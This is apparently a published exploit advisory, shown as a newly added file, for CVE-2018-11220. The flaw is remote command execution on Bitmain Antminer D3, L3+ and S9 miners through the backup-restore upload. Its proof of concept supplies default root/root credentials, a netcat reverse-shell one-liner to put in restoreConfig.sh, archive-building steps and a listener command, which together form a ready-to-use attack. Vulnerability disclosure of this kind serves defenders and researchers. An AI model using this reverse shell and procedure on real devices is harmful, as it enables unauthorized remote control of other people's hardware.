@@ -1,0 +1,41 @@
+# Exploit Title: Bitmain Antminer D3, L3+, and S9 devices allow Remote Command Execution
+# Google Dork: N/A
+# Date: 27/05/2018
+# Exploit Author: Corrado Liotta
+# Vendor Homepage: https://www.bitmain.com/
+# Software Link: N/A
+# Version: Antminer - D3, L3+, S9, and other
+# Tested on: Windows/Linux
+# CVE : CVE-2018-11220
+
+#Description
+
+The software used by the miners produced by the bitmain (AntMiner) is
+affected by a vulnerability of remote code execution type, it is possible
+through the "Retore Backup" functionality of the administration portal to
+execute commands on the system. This would allow a malicious user with
+valid credentials to access the entire file system with administrative
+privileges.
+
+#POC
+
+Login on Antminer Configuration Portal (Default Credential: root/root)
+
+1) Create a file named:
+
+restoreConfig.sh
+
+2) insert inside:
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc your_ip your_port
+>/tmp/f
+
+3) Generate archive by inserting the file created before:
+
+Exploit.tar
+
+4) Launch net cat and upload file:
+
+nc -vv -l -p port
+
+system --> upgrade --> upload archive
